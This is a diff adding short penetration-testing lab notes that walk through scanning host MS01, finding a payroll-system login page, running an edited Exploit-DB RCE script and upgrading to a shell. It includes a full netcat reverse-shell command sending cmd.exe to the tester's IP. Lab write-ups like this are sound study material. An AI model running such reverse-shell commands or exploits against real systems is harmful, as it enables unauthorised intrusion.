@@ -1,0 +1,11 @@
+
+- Install an automated scanner such as AutoRecon, NmapAutomator, FScan
+- Scanned the MS01 and got a bunch of open ports. Looked at all the HTTP ports to visit the pages, then dirsearched on the pages to find additional pages to visit such as a login page.
+- There was a page on port 81, that had a login page. 
+- When looking at the source code, there was a title that was called Attendance and Payroll System.
+- Googled Attendance and Payroll System vulnerabilities and RCE to find a script on Exploit-DB.
+- Look at the file path in the exploit and compare to what is given back to you on the actual website (remove apsystem from the file path to make exploit work)
+- Command was: sudo python3 "Exploit-DB edited script" http://IPAddr:81
+- Upload a nc.exe listener to upgrade your shell
+- command syntax is: nc.exe -e cmd.exe myIP listener port (nc.exe -e cmd.exe 192.168.45.241 8888)
+- ![[Pasted image 20230821135938.png]]
